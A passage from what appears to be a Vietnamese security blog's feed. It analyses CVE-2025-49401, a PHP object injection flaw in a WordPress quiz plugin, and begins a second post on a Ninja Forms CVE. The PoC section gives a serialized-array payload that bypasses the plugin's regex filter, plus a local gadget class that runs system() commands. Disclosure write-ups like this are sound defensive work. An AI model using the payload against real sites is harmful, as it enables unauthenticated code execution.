{&#xA;&#x9;if ( is_string( $qmn_sanitize_random_ids ) ) {&#xA;&#x9;&#x9;if ( preg_match( &amp;#39;/^(O|C):\d&amp;#43;:/&amp;#39;, $qmn_sanitize_random_ids ) ) {&#xA;&#x9;&#x9;&#x9;return &amp;#39;&amp;#39;;&#xA;&#x9;&#x9;}&#xA;&#xA;&#x9;&#x9;if ( is_serialized( $qmn_sanitize_random_ids ) ) {&#xA;&#x9;&#x9;&#x9;$unserialized = maybe_unserialize( $qmn_sanitize_random_ids );&#xA;&#x9;&#x9;&#x9;if ( ! is_object( $unserialized ) &amp;amp;&amp;amp; ! is_resource( $unserialized ) ) {&#xA;&#x9;&#x9;&#x9;&#x9;return $unserialized;&#xA;&#x9;&#x9;&#x9;}&#xA;&#x9;&#x9;}&#xA;&#x9;}&#xA;&#xA;&#x9;return $qmn_sanitize_random_ids;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tr∆∞·ªõc khi &lt;code&gt;maybe_unserialize&lt;/code&gt; ƒë∆∞·ª£c g·ªçi, ta c·∫ßn ph·∫£i v∆∞·ª£t qua b·ªô l·ªçc duy nh·∫•t ·ªü ƒë√¢y:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( preg_match( &amp;#39;/^(O|C):\d&amp;#43;:/&amp;#39;, $qmn_sanitize_random_ids ) ) {&#xA;    return &amp;#39;&amp;#39;;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;preg_match&lt;/code&gt; ki·ªÉm tra xem trong chu·ªói &lt;code&gt;$qmn_sanitize_random_ids&lt;/code&gt; c√≥ t·ªìn t·∫°i chu·ªói con b·∫Øt ƒë·∫ßu b·∫±ng &lt;code&gt;O:&lt;/code&gt; ho·∫∑c &lt;code&gt;C:&lt;/code&gt;. V√≠ d·ª• &lt;code&gt;O:8:&amp;quot;stdClass&amp;quot;:...&lt;/code&gt; ho·∫∑c &lt;code&gt;C:...&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nh∆∞ng r·∫•t ti·∫øc, l·ªõp ph√≤ng th·ªß n√†y ch∆∞a ch·∫∑t. Chu·ªói serialize c√≥ th·ªÉ b·∫Øt ƒë·∫ßu b·∫±ng &lt;code&gt;a:&lt;/code&gt; t·ª©c l√† array, trong array c√≥ th·ªÉ ch·ª©c &lt;code&gt;O:&lt;/code&gt; ho·∫∑c &lt;code&gt;C:&lt;/code&gt; ƒë·ªÉ k√≠ch ho·∫°t s·ª± ki·ªán deserialize, g√¢y nguy c∆° unserialize object injection.&lt;/p&gt;&#xA;&lt;hr&gt;&#xA;&lt;p&gt;Plugin ƒë√£ ƒëƒÉng k√Ω m·ªôt ajax d√†nh cho &lt;strong&gt;unauthenticated user&lt;/strong&gt; (nopriv)&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;wp_ajax_nopriv_qmn_process_quiz&amp;#39;, array( $this, &amp;#39;ajax_submit_results&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Khi request ƒë·∫øn endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; v·ªõi &lt;code&gt;action=qmn_process_quiz&lt;/code&gt; th√¨ callback &lt;code&gt;ajax_submit_results()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi.&lt;/p&gt;&#xA;&lt;p&gt;Sau ƒë√≥ &lt;code&gt;ajax_submit_results()&lt;/code&gt; s·∫Ω g·ªçi ƒë·∫øn &lt;code&gt;submit_results()&lt;/code&gt;, encode JSON v√† echo gi√° tr·ªã tr·∫£ v·ªÅ&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;echo wp_json_encode( $this-&amp;gt;submit_results( $options, $data ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;submit_results()&lt;/code&gt; g·ªçi ƒë·∫øn &lt;code&gt;display_results_text()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$results_pages   = $this-&amp;gt;display_results_text( $qmn_quiz_options, $qmn_array_for_variables );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;display_results_text()&lt;/code&gt; g·ªçi ƒë·∫øn &lt;code&gt;generate_pages()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;return QSM_Results_Pages::generate_pages( $response_data );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;generate_pages()&lt;/code&gt; s·∫Ω apply filter ƒë√£ ƒë∆∞·ª£c ƒëƒÉng k√Ω tr∆∞·ªõc &lt;code&gt;mlw_qmn_template_variable_results_page&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;echo apply_filters( &amp;#39;mlw_qmn_template_variable_results_page&amp;#39;, $page, $response_data );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/callback.png&#34; title=&#34;R·∫•t nhi·ªÅu callback ƒë∆∞·ª£c ƒëƒÉng k√Ω&#34; data-thumbnail=&#34;/posts/2025-11-17-cve-2025-49401/callback.png&#34; data-sub-html=&#34;&lt;h2&gt;Callback&lt;/h2&gt;&lt;p&gt;R·∫•t nhi·ªÅu callback ƒë∆∞·ª£c ƒëƒÉng k√Ω&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-17-cve-2025-49401/callback.png&#39; alt=&#34;Callback&#34; height=&#34;786&#34; width=&#34;1398&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;R·∫•t nhi·ªÅu callback ƒë∆∞·ª£c ƒëƒÉng k√Ω&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;C√≥ r·∫•t nhi·ªÅu callback ƒë∆∞·ª£c ƒëƒÉng k√Ω c√≥ filter &lt;code&gt;mlw_qmn_template_variable_results_page&lt;/code&gt;, nh∆∞ng ·ªü ƒë√¢y ta ch·ªâ quan t√¢m ƒë·∫øn callback &lt;code&gt;mlw_qmn_variable_question_answers&lt;/code&gt;, n√≥ s·∫Ω tr·ª±c ti·∫øp g·ªçi ƒë·∫øn h√†m &lt;code&gt;qsm_questions_answers_shortcode_to_text()&lt;/code&gt; ta ƒë√£ ph√¢n t√≠ch ·ªü tr√™n.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;POST /wp-admin/admin-ajax.php&amp;#34;] -- action=qmn_process_quiz&amp;amp;other_post_data --&amp;gt; B[&amp;#34;wp_ajax_nopriv_qmn_process_quiz&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;ajax_submit_results()&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;submit_results()&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;display_results_text()&amp;#34;]&#xA;E --&amp;gt; F[&amp;#34;generate_pages()&amp;#34;]&#xA;F -- apply filter mlw_qmn_template_variable_results_page --&amp;gt; G[&amp;#34;mlw_qmn_variable_question_answers()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;qsm_questions_answers_shortcode_to_text()&amp;#34;]&#xA;H --&amp;gt; K{&amp;#34; ! empty( $_POST[&amp;#39;quiz_answer_random_ids&amp;#39;] )&amp;#34;}&#xA;K -- true --&amp;gt; L[&amp;#34;qmn_sanitize_random_ids_data()&amp;#34;] --&amp;gt; M{&amp;#34;preg_match( &amp;#39;/^(O|C):\d&amp;#43;:/&amp;#39;, $qmn_sanitize_random_ids )&amp;#34;}&#xA;M -- true --&amp;gt; N[&amp;#34;return &amp;#39;&amp;#39;&amp;#34;]&#xA;M -- false --&amp;gt; V[&amp;#34;maybe_unserialize&amp;#34;] --&amp;gt; W[&amp;#34;RCE&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;S·ª≠ d·ª•ng plugin ƒë·ªÉ t·∫°o post ch·ª© quiz b·∫±ng vi·ªác s·ª≠ d·ª•ng QSM block&lt;/li&gt;&#xA;&lt;li&gt;Submit form v√† cho request ƒëi qua Burp proxy&lt;/li&gt;&#xA;&lt;li&gt;S·ª≠a l·∫°i &lt;code&gt;value&lt;/code&gt; c·ªßa &lt;code&gt;quiz_answer_random_ids&lt;/code&gt; ch·ª©a chu·ªïi serialized&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;a:1:{i:0;O:15:&amp;#34;ObjectInjection&amp;#34;:1:{s:7:&amp;#34;command&amp;#34;;s:4:&amp;#34;ls /&amp;#34;;}}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;G·ª≠i l·∫°i request&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;div class=&#34;alert alert-tip&#34;&gt;&lt;p class=&#34;alert-title&#34;&gt;&lt;svg class=&#34;icon&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34; viewBox=&#34;0 0 16 16&#34; width=&#34;16&#34; height=&#34;16&#34;&gt;&lt;path d=&#34;M8 1.5c-2.363.0-4 1.69-4 3.75.0.984.424 1.625.984 2.304l.214.253c.223.264.47.556.673.848.284.411.537.896.621 1.49a.75.75.0 01-1.484.211c-.04-.282-.163-.547-.37-.847a8.456 8.456.0 00-.542-.68c-.084-.1-.173-.205-.268-.32C3.201 7.75 2.5 6.766 2.5 5.25 2.5 2.31 4.863.0 8 0s5.5 2.31 5.5 5.25c0 1.516-.701 2.5-1.328 3.259-.095.115-.184.22-.268.319-.207.245-.383.453-.541.681-.208.3-.33.565-.37.847a.751.751.0 01-1.485-.212c.084-.593.337-1.078.621-1.489.203-.292.45-.584.673-.848.075-.088.147-.173.213-.253.561-.679.985-1.32.985-2.304.0-2.06-1.637-3.75-4-3.75zM5.75 12h4.5a.75.75.0 010 1.5h-4.5a.75.75.0 010-1.5zM6 15.25a.75.75.0 01.75-.75h2.5a.75.75.0 010 1.5h-2.5A.75.75.0 016 15.25z&#34;/&gt;&lt;/svg&gt;M·∫πo&lt;/p&gt;&lt;p&gt;ƒê·ªÉ test tr√™n local, ta t·∫°o class ch·ª©a magic method &lt;code&gt;__wakeup()&lt;/code&gt; s·∫Ω t·ª± k√≠ch ho·∫°t khi deserialized ƒë·∫∑t n√≥ trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;class ObjectInjection&#xA;{&#xA;  public $command;&#xA;  function __destruct(){&#xA;  &#x9;die(system($this-&amp;gt;command));&#xA;  }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;CVE-2025-49401&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫ßu v√†o thi·∫øu an to√†n v·ªõi &lt;code&gt;maybe_unserialize()&lt;/code&gt;, cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c cung c·∫•p payload serialized ƒë·ªÉ th·ª±c thi PHP Object Injection. C∆° ch·∫ø l·ªçc y·∫øu d·ª±a tr√™n &lt;code&gt;preg_match&lt;/code&gt; ch·ªâ ch·∫∑n payload b·∫Øt ƒë·∫ßu b·∫±ng &lt;code&gt;O:&lt;/code&gt; ho·∫∑c &lt;code&gt;C:&lt;/code&gt;, nh∆∞ng ho√†n to√†n th·∫•t b·∫°i tr∆∞·ªõc serialized array ch·ª©a object. K·∫øt h·ª£p v·ªõi endpoint AJAX m·ªü (&lt;code&gt;wp_ajax_nopriv_qmn_process_quiz&lt;/code&gt;), lu·ªìng th·ª±c thi d·∫´n payload ƒëi qua nhi·ªÅu l·ªõp x·ª≠ l√Ω tr∆∞·ªõc khi b·ªã unserialize, cu·ªëi c√πng g√¢y ra th·ª±c thi m√£ t√πy √Ω (RCE) n·∫øu t·ªìn t·∫°i gadget ph√π h·ª£p. B·∫£n v√° s·ª≠ d·ª•ng &lt;code&gt;unserialize(..., [&#39;allowed_classes&#39; =&amp;gt; false])&lt;/code&gt; ƒë√£ lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng t·∫°o object, t·ª´ ƒë√≥ x·ª≠ l√Ω tri·ªát ƒë·ªÉ l·ªó h·ªïng.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;maybe_unserialize() lu√¥n nguy hi·ªÉm&lt;/strong&gt; khi x·ª≠ l√Ω d·ªØ li·ªáu ƒë·∫øn t·ª´ ng∆∞·ªùi d√πng, ƒë·∫∑c bi·ªát trong m√¥i tr∆∞·ªùng WordPress.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Regex th·ªß c√¥ng kh√¥ng ƒë·ªß an to√†n&lt;/strong&gt; ƒë·ªÉ ngƒÉn khai th√°c deserialization ‚Äî attacker c√≥ th·ªÉ ƒë√≥ng g√≥i payload trong array ƒë·ªÉ bypass.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;AJAX endpoint d√†nh cho unauthenticated user&lt;/strong&gt; l√† b·ªÅ m·∫∑t t·∫•n c√¥ng c·ª±c k·ª≥ nh·∫°y c·∫£m v√† c·∫ßn ƒë∆∞·ª£c ki·ªÉm tra nghi√™m ng·∫∑t.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;allowed_classes = false&lt;/strong&gt; l√† bi·ªán ph√°p ph√≤ng th·ªß hi·ªáu qu·∫£ nh·∫•t khi kh√¥ng c·∫ßn unserialize object.&lt;/li&gt;&#xA;&lt;li&gt;T√≠nh nƒÉng plugin c√†ng ph·ª©c t·∫°p, &lt;strong&gt;nguy c∆° xu·∫•t hi·ªán gadget chain d·∫´n ƒë·∫øn RCE c√†ng cao&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/quiz-master-next/vulnerability/wordpress-quiz-and-survey-master-plugin-10-2-5-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Quiz And Survey Master Plugin &amp;lt;= 10.2.5 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-9083 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-14-cve-2025-9083/</link>
      <pubDate>Fri, 14 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-14-cve-2025-9083/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-14-cve-2025-9083/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin n√†y th·ª±c hi·ªán thao t√°c &lt;strong&gt;unserialize&lt;/strong&gt; d·ªØ li·ªáu m√† ng∆∞·ªùi d√πng g·ª≠i qua tr∆∞·ªùng form, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p &lt;strong&gt;ng∆∞·ªùi d√πng ch∆∞a x√°c th·ª±c&lt;/strong&gt; th·ª±c hi·ªán &lt;strong&gt;PHP Object Injection&lt;/strong&gt; n·∫øu t·ªìn t·∫°i m·ªôt &lt;em&gt;gadget&lt;/em&gt; ph√π h·ª£p trong h·ªá th·ªëng.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-9083&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-9083&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.11.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.11.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ninja-forms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Forms Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Ninja Forms&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.11.0&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.11.1&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 